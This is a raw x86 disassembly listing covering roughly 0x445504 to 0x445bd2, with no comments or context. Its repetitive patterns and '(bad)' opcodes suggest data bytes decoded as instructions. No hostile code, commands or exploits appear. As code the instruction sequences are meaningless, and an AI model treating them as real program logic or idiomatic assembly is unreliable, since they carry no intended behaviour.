  445504:	add    BYTE PTR ds:0x260000ff,bh
  44550a:	inc    DWORD PTR [eax]
  44550c:	add    BYTE PTR ds:0xa0000ff,dl
  445512:	inc    DWORD PTR [eax]
  445514:	add    BYTE PTR [edi+edi*8],al
  445517:	add    BYTE PTR [eax],al
  445519:	add    edi,edi
  44551b:	add    BYTE PTR [eax],al
  44551d:	add    bh,bh
  44551f:	add    BYTE PTR [eax],al
  445521:	add    bh,bh
  445523:	add    BYTE PTR [eax],al
  445525:	add    bh,bh
  445527:	add    BYTE PTR [eax],al
  445529:	add    bh,bh
  44552b:	add    BYTE PTR [eax],al
  44552d:	add    bh,bh
  44552f:	add    BYTE PTR [eax],al
  445531:	add    bh,bh
  445533:	add    BYTE PTR [eax],al
  445535:	add    bh,bh
  445537:	add    BYTE PTR [eax],al
  445539:	add    bh,bh
  44553b:	add    BYTE PTR [eax],al
  44553d:	add    bh,bh
  44553f:	add    BYTE PTR [eax],al
  445541:	add    bh,bh
  445543:	add    BYTE PTR [eax],al
  445545:	add    bh,bh
  445547:	add    BYTE PTR [eax],al
  445549:	add    bh,bh
  44554b:	add    BYTE PTR [eax],al
  44554d:	add    bh,bh
  44554f:	add    BYTE PTR [eax],al
  445551:	add    bh,bh
  445553:	add    BYTE PTR [eax],al
  445555:	add    bh,bh
  445557:	add    BYTE PTR [eax],al
  445559:	add    bh,bh
  44555b:	add    BYTE PTR [eax],al
  44555d:	add    bh,bh
  44555f:	add    BYTE PTR [eax],al
  445561:	add    bh,bh
  445563:	add    BYTE PTR [eax],al
  445565:	add    bh,bh
  445567:	add    BYTE PTR [eax],al
  445569:	add    bh,bh
  44556b:	add    BYTE PTR [eax],al
  44556d:	add    bh,bh
  44556f:	add    BYTE PTR [eax],al
  445571:	add    edi,edi
  445573:	add    BYTE PTR [eax],al
  445575:	add    al,0xff
  445577:	add    BYTE PTR [eax],al
  445579:	or     bh,bh
  44557b:	add    BYTE PTR [eax],al
  44557d:	adc    eax,0x280000ff
  445582:	inc    DWORD PTR [eax]
  445584:	add    BYTE PTR [ebx-0x1],al
  445587:	add    BYTE PTR [eax],al
  445589:	inc    DWORD PTR fs:[eax]
  44558c:	add    BYTE PTR [edi-0x61f8ff01],al
  445592:	inc    DWORD PTR [ebx]
  445594:	add    al,0xe1
  445596:	inc    DWORD PTR [ecx]
  445598:	or     al,0xf1
  44559a:	inc    DWORD PTR [eax]
  44559c:	or     bh,bh
  44559e:	inc    DWORD PTR [esi]
  4455a0:	or     ah,al
  4455a2:	dec    DWORD PTR [edi]
  4455a4:	adc    DWORD PTR [edx+0x271214ff],ecx
  4455aa:	call   FWORD PTR [edx]
  4455ac:	sbb    DWORD PTR [ecx],esi
  4455ae:	call   FWORD PTR [ebx+ebx*1]
  4455b1:	sbb    al,0xff
  4455b3:	femms  
  4455b5:	or     edi,edi
  4455b7:	and    bl,BYTE PTR [esi]
  4455b9:	inc    ecx
  4455ba:	call   DWORD PTR [edx]
  4455bc:	or     al,0x9d
  4455be:	inc    DWORD PTR [eax]
  4455c0:	add    BYTE PTR [ecx-0x54ffff01],ch
  4455c6:	inc    DWORD PTR [eax]
  4455c8:	add    dh,al
  4455ca:	call   DWORD PTR [esp+edx*1]
  4455cd:	mov    ds:0x112623ff,al
  4455d2:	call   DWORD PTR [edi]
  4455d4:	adc    eax,0x1513ff2e
  4455d9:	dec    DWORD PTR ds:[ecx+edx*1]
  4455dd:	cmp    al,0xff
  4455df:	pop    es
  4455e0:	or     eax,DWORD PTR [ecx-0x1]
  4455e3:	or     BYTE PTR [eax],cl
  4455e5:	and    bh,bh
  4455e7:	add    cl,BYTE PTR [edx]
  4455e9:	sar    edi,1
  4455eb:	add    BYTE PTR [edi],cl
  4455ed:	clc    
  4455ee:	call   DWORD PTR [esi]
  4455f0:	adc    DWORD PTR [edx-0x1],ebx
  4455f3:	sbb    DWORD PTR [edx+esi*1],edx
  4455f6:	jmp    DWORD PTR [eax]
  4455f8:	push   ds
  4455f9:	cmp    al,0xff
  4455fb:	adc    ecx,DWORD PTR [esi]
  4455fd:	inc    esp
  4455fe:	inc    DWORD PTR [eax]
  445600:	add    BYTE PTR [esi],bh
  445602:	call   FWORD PTR [eax]
  445604:	sbb    eax,0x1a15ff3e
  445609:	and    bh,bh
  44560b:	add    BYTE PTR [eax],al
  44560d:	int    0xff
  44560f:	or     BYTE PTR [esp+edx*8],dl
  445612:	call   FWORD PTR [eax]
  445614:	push   ss
  445615:	or     edi,edi
  445617:	sbb    BYTE PTR [edx+edi*1],dl
  44561a:	call   FWORD PTR [eax]
  44561c:	push   ss
  44561d:	aas    
  44561e:	call   DWORD PTR [ebx+ebx*1]
  445621:	inc    esi
  445622:	call   FWORD PTR ds:0xeff271f
  445628:	pop    ss
  445629:	mov    dh,0xff
  44562b:	add    BYTE PTR [ecx],al
  44562d:	mov    al,ds:0x5c0000ff
  445632:	inc    DWORD PTR [eax]
  445634:	add    BYTE PTR [esi],ch
  445636:	inc    DWORD PTR [eax]
  445638:	add    BYTE PTR [eax],dl
  44563a:	inc    DWORD PTR [eax]
  44563c:	add    BYTE PTR [ecx],al
  44563e:	inc    DWORD PTR [eax]
  445640:	add    BYTE PTR [ecx],al
  445642:	inc    DWORD PTR [eax]
  445644:	add    BYTE PTR ds:0xd0000ff,al
  44564a:	inc    DWORD PTR [eax]
  44564c:	add    BYTE PTR ds:0x360000ff,bl
  445652:	inc    DWORD PTR [eax]
  445654:	add    BYTE PTR [ecx-0x1],bl
  445657:	add    BYTE PTR [eax],al
  445659:	test   bh,bh
  44565b:	add    BYTE PTR [eax],al
  44565d:	mov    ch,0xff
  44565f:	add    BYTE PTR [esi+edi*8],cl
  445662:	call   DWORD PTR [edx]
  445664:	sub    DWORD PTR [ebx+0x492115ff],eax
  44566a:	call   DWORD PTR [edi]
  44566c:	sbb    eax,0xf0dff67
  445671:	inc    esp
  445672:	dec    DWORD PTR [ecx]
  445674:	pop    es
  445675:	and    edi,edi
  445677:	pop    es
  445678:	or     bh,BYTE PTR [edx]
  44567a:	inc    DWORD PTR ds:0x5ff930d
  445680:	or     BYTE PTR [edx-0x1],al
  445683:	add    eax,0x5ff1e08
  445688:	add    al,0x1a
  44568a:	inc    DWORD PTR [ecx]
  44568c:	or     al,0x9b
  44568e:	jmp    FWORD PTR [ecx]
  445690:	daa    
  445691:	pop    edi
  445692:	jmp    DWORD PTR [ebx]
  445694:	push   ds
  445695:	xchg   edx,eax
  445696:	dec    DWORD PTR [edi]
  445698:	or     al,0xc0
  44569a:	dec    DWORD PTR [edi]
  44569c:	adc    DWORD PTR [edi+edi*8+0x12],ecx
  4456a0:	adc    DWORD PTR [eax],edi
  4456a2:	call   DWORD PTR [edx]
  4456a4:	adc    al,0x35
  4456a6:	call   FWORD PTR [edx]
  4456a8:	sbb    eax,DWORD PTR [esi-0x1]
  4456ab:	and    eax,0x23ff5222
  4456b0:	and    eax,0x1514ff52
  4456b5:	fwait
  4456b6:	call   FWORD PTR [esi]
  4456b8:	pop    ss
  4456b9:	inc    ebx
  4456ba:	call   DWORD PTR [eax]
  4456bc:	push   cs
  4456bd:	and    edi,edi
  4456bf:	pop    ds
  4456c0:	sbb    DWORD PTR [edi],esp
  4456c2:	call   DWORD PTR [eax]
  4456c4:	or     al,0x34
  4456c6:	call   DWORD PTR [edi]
  4456c8:	adc    al,0x27
  4456ca:	jmp    DWORD PTR [eax]
  4456cc:	pop    ds
  4456cd:	inc    esp
  4456ce:	jmp    DWORD PTR ds:0x15ff7234
  4456d4:	and    BYTE PTR [esi+0x3a131aff],dl
  4456da:	jmp    DWORD PTR [ebx]
  4456dc:	sbb    al,0x3e
  4456de:	call   FWORD PTR [edx]
  4456e0:	adc    al,0xb2
  4456e2:	jmp    DWORD PTR [edi+eiz*1]
  4456e5:	xchg   bh,bh
  4456e7:	sbb    esp,DWORD PTR [eax*8-0xcf7ff01]
  4456ee:	inc    DWORD PTR [eax]
  4456f0:	add    BYTE PTR [edx-0x77ffff01],ch
  4456f6:	inc    DWORD PTR [eax]
  4456f8:	add    BYTE PTR [edx-0x1],ch
  4456fb:	add    BYTE PTR [eax],al
  4456fd:	dec    esp
  4456fe:	inc    DWORD PTR [eax]
  445700:	add    BYTE PTR [ebx],dh
  445702:	inc    DWORD PTR [eax]
  445704:	add    BYTE PTR [edi],bl
  445706:	inc    DWORD PTR [eax]
  445708:	add    BYTE PTR [ecx],dl
  44570a:	inc    DWORD PTR [eax]
  44570c:	add    BYTE PTR [eax],cl
  44570e:	inc    DWORD PTR [eax]
  445710:	add    BYTE PTR [ebx],al
  445712:	inc    DWORD PTR [eax]
  445714:	add    BYTE PTR [ecx],al
  445716:	inc    DWORD PTR [eax]
  445718:	add    BYTE PTR [eax],al
  44571a:	inc    DWORD PTR [eax]
  44571c:	add    BYTE PTR [eax],al
  44571e:	inc    DWORD PTR [eax]
  445720:	add    BYTE PTR [eax],al
  445722:	inc    DWORD PTR [eax]
  445724:	add    BYTE PTR [eax],al
  445726:	inc    DWORD PTR [eax]
  445728:	add    BYTE PTR [eax],al
  44572a:	inc    DWORD PTR [eax]
  44572c:	add    BYTE PTR [eax],al
  44572e:	inc    DWORD PTR [eax]
  445730:	add    BYTE PTR [eax],al
  445732:	inc    DWORD PTR [eax]
  445734:	add    BYTE PTR [eax],al
  445736:	inc    DWORD PTR [eax]
  445738:	add    BYTE PTR [eax],al
  44573a:	inc    DWORD PTR [eax]
  44573c:	add    BYTE PTR [eax],al
  44573e:	inc    DWORD PTR [eax]
  445740:	add    BYTE PTR [eax],al
  445742:	inc    DWORD PTR [eax]
  445744:	add    BYTE PTR [eax],al
  445746:	inc    DWORD PTR [eax]
  445748:	add    BYTE PTR [eax],al
  44574a:	inc    DWORD PTR [eax]
  44574c:	add    BYTE PTR [eax],al
  44574e:	inc    DWORD PTR [eax]
  445750:	add    BYTE PTR [eax],al
  445752:	inc    DWORD PTR [eax]
  445754:	add    BYTE PTR [eax],al
  445756:	inc    DWORD PTR [eax]
  445758:	add    BYTE PTR [eax],al
  44575a:	inc    DWORD PTR [eax]
  44575c:	add    BYTE PTR [eax],al
  44575e:	inc    DWORD PTR [eax]
  445760:	add    BYTE PTR [eax],al
  445762:	inc    DWORD PTR [eax]
  445764:	add    BYTE PTR [eax],al
  445766:	inc    DWORD PTR [eax]
  445768:	add    BYTE PTR [eax],al
  44576a:	inc    DWORD PTR [eax]
  44576c:	add    BYTE PTR [eax],al
  44576e:	inc    DWORD PTR [eax]
  445770:	add    BYTE PTR [eax],al
  445772:	inc    DWORD PTR [eax]
  445774:	add    BYTE PTR [ecx],al
  445776:	inc    DWORD PTR [eax]
  445778:	add    BYTE PTR [edi+edi*8],al
  44577b:	add    BYTE PTR [eax],al
  44577d:	or     edi,edi
  44577f:	add    BYTE PTR [eax],al
  445781:	adc    edi,edi
  445783:	add    BYTE PTR [eax],al
  445785:	and    al,0xff
  445787:	add    BYTE PTR [eax],al
  445789:	cmp    edi,edi
  44578b:	add    BYTE PTR [eax],al
  44578d:	pop    eax
  44578e:	inc    DWORD PTR [eax]
  445790:	add    BYTE PTR [eax-0x1],bh
  445793:	add    BYTE PTR [eax],al
  445795:	jl     0x445796
  445797:	add    BYTE PTR [eax],al
  445799:	sar    bh,1
  44579b:	add    BYTE PTR [eax],al
  44579d:	into   
  44579e:	inc    DWORD PTR [eax]
  4457a0:	add    ch,ah
  4457a2:	inc    DWORD PTR [eax]
  4457a4:	or     bh,al
  4457a6:	dec    DWORD PTR [eax]
  4457a8:	add    esi,DWORD PTR [ebx-0x1]
  4457ab:	adc    eax,0xaff4f11
  4457b0:	or     BYTE PTR [ebx-0x6df7f701],dh
  4457b6:	jmp    DWORD PTR [esi+ebx*1]
  4457b9:	xor    bh,bh
  4457bb:	adc    cl,BYTE PTR [ebx]
  4457bd:	xchg   esp,eax
  4457be:	inc    DWORD PTR [eax]
  4457c0:	add    BYTE PTR [edi+edi*8-0x670000],dl
  4457c7:	add    BYTE PTR [eax],al
  4457c9:	mov    esp,0xc60203ff
  4457ce:	inc    DWORD PTR [ebx]
  4457d0:	add    al,BYTE PTR [eax]
  4457d2:	dec    DWORD PTR ds:0x12ff2c0d
  4457d8:	sbb    edi,DWORD PTR ds:0x4c150bff
  4457de:	dec    DWORD PTR [ecx]
  4457e0:	adc    cl,BYTE PTR [edi+edi*8+0x8]
  4457e4:	adc    BYTE PTR [edi-0x1],dl
  4457e7:	add    al,BYTE PTR [ebx]
  4457e9:	out    dx,al
  4457ea:	inc    DWORD PTR [eax]
  4457ec:	or     al,0xf9
  4457ee:	call   DWORD PTR [esi+ecx*1]
  4457f1:	cmp    edi,edi
  4457f3:	and    bl,BYTE PTR [edi]
  4457f5:	inc    edx
  4457f6:	call   DWORD PTR ds:0xff1811
  4457fc:	add    bl,dl
  4457fe:	inc    DWORD PTR [edx]
  445800:	pop    es
  445801:	fdiv   st(7),st
  445803:	and    ah,BYTE PTR [edi]
  445805:	call   DWORD PTR cs:[edi]
  445808:	sbb    eax,0x1702ff2b
  44580d:	fdivp  st(7),st
  44580f:	add    BYTE PTR [eax],dl
  445811:	(bad)  
  445812:	call   DWORD PTR [esi]
  445814:	pop    ss
  445815:	xor    edi,edi
  445817:	sbb    ebx,DWORD PTR [edi]
  445819:	xor    eax,0x411817ff
  44581e:	call   DWORD PTR [esi]
  445820:	sbb    bh,BYTE PTR [edi+edi*8]
  445823:	sbb    DWORD PTR [edx],ebx
  445825:	sbb    al,0xff
  445827:	adc    ah,BYTE PTR [edx]
  445829:	sar    edi,1
  44582b:	add    BYTE PTR [ecx],al
  44582d:	sahf   
  44582e:	inc    DWORD PTR [eax]
  445830:	add    BYTE PTR [ebx-0x1],bl
  445833:	add    BYTE PTR [eax],al
  445835:	inc    DWORD PTR cs:[eax]
  445838:	add    BYTE PTR [eax],dl
  44583a:	inc    DWORD PTR [eax]
  44583c:	add    BYTE PTR [ecx],al
  44583e:	inc    DWORD PTR [eax]
  445840:	add    BYTE PTR [ebx],al
  445842:	inc    DWORD PTR [eax]
  445844:	add    BYTE PTR [edx],cl
  445846:	inc    DWORD PTR [eax]
  445848:	add    BYTE PTR [ecx],bl
  44584a:	inc    DWORD PTR [eax]
  44584c:	add    BYTE PTR [eax],dh
  44584e:	inc    DWORD PTR [eax]
  445850:	add    BYTE PTR [edx-0x1],dl
  445853:	add    BYTE PTR [eax],al
  445855:	jg     0x445856
  445857:	add    BYTE PTR [ebx],cl
  445859:	mov    edi,0xfe0000ff
  44585e:	call   DWORD PTR [eax]
  445860:	sbb    esi,ecx
  445862:	call   DWORD PTR [eax]
  445864:	sbb    ch,BYTE PTR [ecx]
  445866:	dec    DWORD PTR [ebx]
  445868:	cmove  edi,edi
  44586b:	adc    BYTE PTR [esi],cl
  44586d:	dec    esi
  44586e:	call   FWORD PTR [edi]
  445870:	pop    ds
  445871:	pop    esp
  445872:	call   DWORD PTR [esi]
  445874:	sbb    DWORD PTR [edi-0x1],eax
  445877:	add    al,BYTE PTR [esi]
  445879:	cmp    bh,bh
  44587b:	pop    es
  44587c:	or     BYTE PTR ds:0x2a0906ff,ch
  445882:	inc    DWORD PTR ds:0x4ff1b04
  445888:	pop    es
  445889:	cmp    edi,0x0
  44588c:	and    bh,bh
  44588e:	call   FWORD PTR [edi]
  445890:	daa    
  445891:	popf   
  445892:	inc    DWORD PTR ds:0x11ffd001
  445898:	(bad)  
  44589a:	dec    DWORD PTR [edi]
  44589c:	adc    al,BYTE PTR [ebx-0x1]
  44589f:	or     eax,0x1dff3411
  4458a4:	push   ds
  4458a5:	inc    ebx
  4458a6:	jmp    DWORD PTR [ecx]
  4458a8:	sbb    DWORD PTR [ebx],edi
  4458aa:	call   FWORD PTR [esi]
  4458ac:	sbb    BYTE PTR [ecx-0x1],al
  4458af:	pop    ss
  4458b0:	adc    al,0x66
  4458b2:	call   FWORD PTR [esi]
  4458b4:	sbb    al,0x8e
  4458b6:	jmp    DWORD PTR [ecx+eiz*1]
  4458b9:	das    
  4458ba:	jmp    DWORD PTR [esi]
  4458bc:	sbb    ebx,DWORD PTR [edx]
  4458be:	call   FWORD PTR [eax]
  4458c0:	adc    eax,0x101ff6a
  4458c5:	mov    ebx,0x9c0506ff
  4458ca:	jmp    DWORD PTR [edi+esi*1]
  4458cd:	xchg   ebp,eax
  4458ce:	jmp    FWORD PTR [edx]
  4458d0:	dec    ebp
  4458d1:	mov    ah,0xff
  4458d3:	push   es
  4458d4:	or     BYTE PTR [edi+edi*8-0x4bfdfb],dl
  4458db:	add    BYTE PTR [eax],al
  4458dd:	fcos   
  4458df:	add    al,BYTE PTR ds:0xd05fff4
  4458e5:	out    dx,al
  4458e6:	inc    DWORD PTR [eax]
  4458e8:	add    al,0xca
  4458ea:	inc    DWORD PTR [eax]
  4458ec:	add    BYTE PTR [ebx+0x700000ff],cl
  4458f2:	inc    DWORD PTR [eax]
  4458f4:	add    BYTE PTR [ebp-0x1],dl
  4458f7:	add    BYTE PTR [eax],al
  4458f9:	cmp    al,0xff
  4458fb:	add    BYTE PTR [eax],al
  4458fd:	sub    bh,bh
  4458ff:	add    BYTE PTR [eax],al
  445901:	sbb    bh,bh
  445903:	add    BYTE PTR [eax],al
  445905:	or     eax,0x60000ff
  44590a:	inc    DWORD PTR [eax]
  44590c:	add    BYTE PTR [edx],al
  44590e:	inc    DWORD PTR [eax]
  445910:	add    BYTE PTR [eax],al
  445912:	inc    DWORD PTR [eax]
  445914:	add    BYTE PTR [eax],al
  445916:	inc    DWORD PTR [eax]
  445918:	add    BYTE PTR [eax],al
  44591a:	inc    DWORD PTR [eax]
  44591c:	add    BYTE PTR [eax],al
  44591e:	inc    DWORD PTR [eax]
  445920:	add    BYTE PTR [eax],al
  445922:	inc    DWORD PTR [eax]
  445924:	add    BYTE PTR [eax],al
  445926:	inc    DWORD PTR [eax]
  445928:	add    BYTE PTR [eax],al
  44592a:	inc    DWORD PTR [eax]
  44592c:	add    BYTE PTR [eax],al
  44592e:	inc    DWORD PTR [eax]
  445930:	add    BYTE PTR [eax],al
  445932:	inc    DWORD PTR [eax]
  445934:	add    BYTE PTR [eax],al
  445936:	inc    DWORD PTR [eax]
  445938:	add    BYTE PTR [eax],al
  44593a:	inc    DWORD PTR [eax]
  44593c:	add    BYTE PTR [eax],al
  44593e:	inc    DWORD PTR [eax]
  445940:	add    BYTE PTR [eax],al
  445942:	inc    DWORD PTR [eax]
  445944:	add    BYTE PTR [eax],al
  445946:	inc    DWORD PTR [eax]
  445948:	add    BYTE PTR [eax],al
  44594a:	inc    DWORD PTR [eax]
  44594c:	add    BYTE PTR [eax],al
  44594e:	inc    DWORD PTR [eax]
  445950:	add    BYTE PTR [eax],al
  445952:	inc    DWORD PTR [eax]
  445954:	add    BYTE PTR [eax],al
  445956:	inc    DWORD PTR [eax]
  445958:	add    BYTE PTR [eax],al
  44595a:	inc    DWORD PTR [eax]
  44595c:	add    BYTE PTR [eax],al
  44595e:	inc    DWORD PTR [eax]
  445960:	add    BYTE PTR [eax],al
  445962:	inc    DWORD PTR [eax]
  445964:	add    BYTE PTR [eax],al
  445966:	inc    DWORD PTR [eax]
  445968:	add    BYTE PTR [eax],al
  44596a:	inc    DWORD PTR [eax]
  44596c:	add    BYTE PTR [eax],al
  44596e:	inc    DWORD PTR [eax]
  445970:	add    BYTE PTR [eax],al
  445972:	inc    DWORD PTR [eax]
  445974:	add    BYTE PTR [eax],al
  445976:	inc    DWORD PTR [eax]
  445978:	add    BYTE PTR [ecx],al
  44597a:	inc    DWORD PTR [eax]
  44597c:	add    BYTE PTR [ebx],al
  44597e:	inc    DWORD PTR [eax]
  445980:	add    BYTE PTR [edi],al
  445982:	inc    DWORD PTR [eax]
  445984:	add    BYTE PTR [eax],dl
  445986:	inc    DWORD PTR [eax]
  445988:	add    BYTE PTR [edi],bl
  44598a:	inc    DWORD PTR [eax]
  44598c:	add    BYTE PTR [ecx],dh
  44598e:	inc    DWORD PTR [eax]
  445990:	add    BYTE PTR [eax-0x1],cl
  445993:	add    BYTE PTR [eax],al
  445995:	pop    edi
  445996:	inc    DWORD PTR [eax]
  445998:	add    BYTE PTR [ebp-0x1],dh
  44599b:	add    BYTE PTR [eax],al
  44599d:	xchg   edi,edi
  44599f:	add    BYTE PTR [eax],al
  4459a1:	cdq    
  4459a2:	inc    DWORD PTR [eax]
  4459a4:	add    ebp,DWORD PTR [edi+edi*8-0x3c0000]
  4459ab:	add    BYTE PTR [eax],al
  4459ad:	(bad)  
  4459b0:	push   es
  4459b1:	fwait
  4459b2:	dec    DWORD PTR [ebx]
  4459b4:	or     al,ch
  4459b6:	dec    DWORD PTR [edx]
  4459b8:	or     ah,ch
  4459ba:	inc    DWORD PTR ds:0xffc303
  4459c0:	add    BYTE PTR [edi-0x1],bh
  4459c3:	add    BYTE PTR [eax],al
  4459c5:	xchg   edi,edi
  4459c7:	add    BYTE PTR [ecx],al
  4459c9:	stos   BYTE PTR es:[edi],al
  4459ca:	inc    DWORD PTR [esi]
  4459cc:	add    eax,0x1815ffee
  4459d1:	sub    edi,edi
  4459d3:	sbb    bl,BYTE PTR [edi]
  4459d5:	push   eax
  4459d6:	call   DWORD PTR [ebx]
  4459d8:	sbb    al,BYTE PTR [edi+edi*8+0xc]
  4459dc:	adc    al,0x46
  4459de:	dec    DWORD PTR ds:0xcff5216
  4459e4:	adc    dl,BYTE PTR [esi-0xfbff01]
  4459ea:	inc    DWORD PTR [ecx]
  4459ec:	pmovmskb edi,mm7
  4459ef:	sbb    BYTE PTR [edx],dl
  4459f1:	xor    al,0xff
  4459f3:	push   ds
  4459f4:	pop    ds
  4459f5:	inc    ebp
  4459f6:	call   DWORD PTR ds:0x5ff3d15
  4459fc:	add    al,0x28
  4459fe:	call   FWORD PTR [ebx]
  445a00:	and    al,BYTE PTR [esi-0x1]
  445a03:	pop    ds
  445a04:	sbb    edi,DWORD PTR [edi+edi*8]
  445a07:	sbb    bl,BYTE PTR [ebx]
  445a09:	sbb    eax,0xc81304ff
  445a0e:	inc    DWORD PTR [eax]
  445a10:	adc    eax,0xf11ffff
  445a15:	dec    ebx
  445a16:	call   FWORD PTR [ecx]
  445a18:	and    DWORD PTR [ebx-0x1],edx
  445a1b:	pop    ss
  445a1c:	and    bl,BYTE PTR [edi-0x1]
  445a1f:	sbb    ah,BYTE PTR [ebx]
  445a21:	push   edi
  445a22:	call   FWORD PTR [ebx]
  445a24:	push   ds
  445a25:	sub    bh,bh
  445a27:	adc    DWORD PTR ds:0x100ffbe,edx
  445a2d:	xchg   esp,eax
  445a2e:	inc    DWORD PTR [eax]
  445a30:	add    BYTE PTR [ebp-0x1],dl
  445a33:	add    BYTE PTR [eax],al
  445a35:	sub    edi,edi
  445a37:	add    BYTE PTR [eax],al
  445a39:	ud0    eax,DWORD PTR [eax]
  445a3c:	add    BYTE PTR [ecx],al
  445a3e:	inc    DWORD PTR [eax]
  445a40:	add    BYTE PTR ds:0x100000ff,al
  445a46:	inc    DWORD PTR [eax]
  445a48:	add    BYTE PTR [ebx],ah
  445a4a:	inc    DWORD PTR [eax]
  445a4c:	add    BYTE PTR [ecx-0x1],al
  445a4f:	add    BYTE PTR [eax],al
  445a51:	push   0xffffffff
  445a53:	add    BYTE PTR [eax],al
  445a55:	mov    edi,?
  445a57:	add    BYTE PTR [eax],al
  445a59:	loop   0x445a5a
  445a5b:	or     al,BYTE PTR [edi]
  445a5d:	mov    ah,0xff
  445a5f:	prefetchnta BYTE PTR [eax-0x1]
  445a63:	push   es
  445a64:	or     BYTE PTR [edx],dh
  445a66:	dec    DWORD PTR [ecx]
  445a68:	or     al,0x3f
  445a6a:	inc    DWORD PTR [esi]
  445a6c:	or     ch,BYTE PTR [ebx-0x1]
  445a6f:	or     eax,0x5ff6510
  445a74:	add    eax,0xa06ff20
  445a79:	sub    bh,bh
  445a7b:	push   es
  445a7c:	push   es
  445a7d:	popa   
  445a7e:	inc    DWORD PTR ds:0x5ff4a03
  445a84:	add    al,0x76
  445a86:	inc    DWORD PTR [eax]
  445a88:	add    ch,dh
  445a8a:	inc    DWORD PTR [edx]
  445a8c:	push   ss
  445a8d:	lock inc DWORD PTR [esi]
  445a90:	add    eax,0x80effe5
  445a95:	(bad)  
  445a96:	call   DWORD PTR ds:0x22ff2f10
  445a9c:	sbb    al,0x3e
  445a9e:	jmp    FWORD PTR [edi]
  445aa0:	and    edi,DWORD PTR [edi+edi*8]
  445aa3:	cs es cmp eax,0x411d23ff
  445aaa:	call   FWORD PTR [ecx]
  445aac:	adc    ebp,DWORD PTR [edi]
  445aae:	jmp    DWORD PTR [ecx]
  445ab0:	sbb    eax,0x2632ff48
  445ab5:	daa    
  445ab6:	jmp    FWORD PTR [edi]
  445ab8:	and    al,0x38
  445aba:	jmp    DWORD PTR [edi]
  445abc:	and    DWORD PTR [ecx],esi
  445abe:	inc    DWORD PTR [esi]
  445ac0:	add    al,0xb8
  445ac2:	inc    DWORD PTR [eax]
  445ac4:	add    dh,ah
  445ac6:	inc    DWORD PTR [eax]
  445ac8:	add    bh,dl
  445aca:	dec    DWORD PTR [edi]
  445acc:	sbb    ch,BYTE PTR [ebx-0x5cfafd01]
  445ad2:	inc    DWORD PTR [eax]
  445ad4:	add    BYTE PTR [edi-0x3fffff01],bl
  445ada:	inc    DWORD PTR [eax]
  445adc:	or     ah,bl
  445ade:	inc    DWORD PTR [eax]
  445ae0:	add    DWORD PTR [esi+0x7f0000ff],ebx
  445ae6:	inc    DWORD PTR [eax]
  445ae8:	add    BYTE PTR [edi-0x1],ch
  445aeb:	add    BYTE PTR [eax],al
  445aed:	pop    eax
  445aee:	inc    DWORD PTR [eax]
  445af0:	add    BYTE PTR [eax-0x1],al
  445af3:	add    BYTE PTR [eax],al
  445af5:	sub    eax,0x1c0000ff
  445afa:	inc    DWORD PTR [eax]
  445afc:	add    BYTE PTR [eax],dl
  445afe:	inc    DWORD PTR [eax]
  445b00:	add    BYTE PTR [ecx],cl
  445b02:	inc    DWORD PTR [eax]
  445b04:	add    BYTE PTR [edi+edi*8],al
  445b07:	add    BYTE PTR [eax],al
  445b09:	add    edi,edi
  445b0b:	add    BYTE PTR [eax],al
  445b0d:	add    bh,bh
  445b0f:	add    BYTE PTR [eax],al
  445b11:	add    bh,bh
  445b13:	add    BYTE PTR [eax],al
  445b15:	add    bh,bh
  445b17:	add    BYTE PTR [eax],al
  445b19:	add    bh,bh
  445b1b:	add    BYTE PTR [eax],al
  445b1d:	add    bh,bh
  445b1f:	add    BYTE PTR [eax],al
  445b21:	add    bh,bh
  445b23:	add    BYTE PTR [eax],al
  445b25:	add    bh,bh
  445b27:	add    BYTE PTR [eax],al
  445b29:	add    bh,bh
  445b2b:	add    BYTE PTR [eax],al
  445b2d:	add    bh,bh
  445b2f:	add    BYTE PTR [eax],al
  445b31:	add    bh,bh
  445b33:	add    BYTE PTR [eax],al
  445b35:	add    bh,bh
  445b37:	add    BYTE PTR [eax],al
  445b39:	add    bh,bh
  445b3b:	add    BYTE PTR [eax],al
  445b3d:	add    bh,bh
  445b3f:	add    BYTE PTR [eax],al
  445b41:	add    bh,bh
  445b43:	add    BYTE PTR [eax],al
  445b45:	add    bh,bh
  445b47:	add    BYTE PTR [eax],al
  445b49:	add    bh,bh
  445b4b:	add    BYTE PTR [eax],al
  445b4d:	add    bh,bh
  445b4f:	add    BYTE PTR [eax],al
  445b51:	add    bh,bh
  445b53:	add    BYTE PTR [eax],al
  445b55:	add    bh,bh
  445b57:	add    BYTE PTR [eax],al
  445b59:	add    bh,bh
  445b5b:	add    BYTE PTR [eax],al
  445b5d:	add    bh,bh
  445b5f:	add    BYTE PTR [eax],al
  445b61:	add    bh,bh
  445b63:	add    BYTE PTR [eax],al
  445b65:	add    bh,bh
  445b67:	add    BYTE PTR [eax],al
  445b69:	add    bh,bh
  445b6b:	add    BYTE PTR [eax],al
  445b6d:	add    bh,bh
  445b6f:	add    BYTE PTR [eax],al
  445b71:	add    bh,bh
  445b73:	add    BYTE PTR [eax],al
  445b75:	add    bh,bh
  445b77:	add    BYTE PTR [eax],al
  445b79:	add    bh,bh
  445b7b:	add    BYTE PTR [eax],al
  445b7d:	add    bh,bh
  445b7f:	add    BYTE PTR [eax],al
  445b81:	add    bh,bh
  445b83:	add    BYTE PTR [eax],al
  445b85:	push   es
  445b86:	inc    DWORD PTR [eax]
  445b88:	add    BYTE PTR ds:0x170000ff,cl
  445b8e:	inc    DWORD PTR [eax]
  445b90:	add    BYTE PTR ds:0x340000ff,ah
  445b96:	inc    DWORD PTR [eax]
  445b98:	add    BYTE PTR [ebx-0x1],al
  445b9b:	add    BYTE PTR [eax],al
  445b9d:	dec    edi
  445b9e:	inc    DWORD PTR [eax]
  445ba0:	add    BYTE PTR [ebx-0x1],bl
  445ba3:	add    BYTE PTR [eax],al
  445ba5:	inc    DWORD PTR fs:[eax]
  445ba8:	add    BYTE PTR [eax-0x1],dh
  445bab:	add    BYTE PTR [eax],al
  445bad:	jns    0x445bae
  445baf:	add    BYTE PTR [eax],al
  445bb1:	jge    0x445bb2
  445bb3:	add    DWORD PTR [ecx],eax
  445bb5:	jl     0x445bb6
  445bb7:	add    BYTE PTR [eax],al
  445bb9:	out    0xff,eax
  445bbb:	add    BYTE PTR [eax],cl
  445bbd:	ins    DWORD PTR es:[edi],dx
  445bbe:	inc    DWORD PTR [eax]
  445bc0:	add    BYTE PTR [edi+edi*8+0x0],ah
  445bc4:	add    BYTE PTR [ecx-0x1],dh
  445bc7:	add    DWORD PTR [ecx],eax
  445bc9:	xchg   edx,eax
  445bca:	inc    DWORD PTR [esi]
  445bcc:	add    eax,0x1f18ffdb
  445bd1:	xchg   ebx,eax
  445bd2:	jmp    DWORD PTR [ebx]
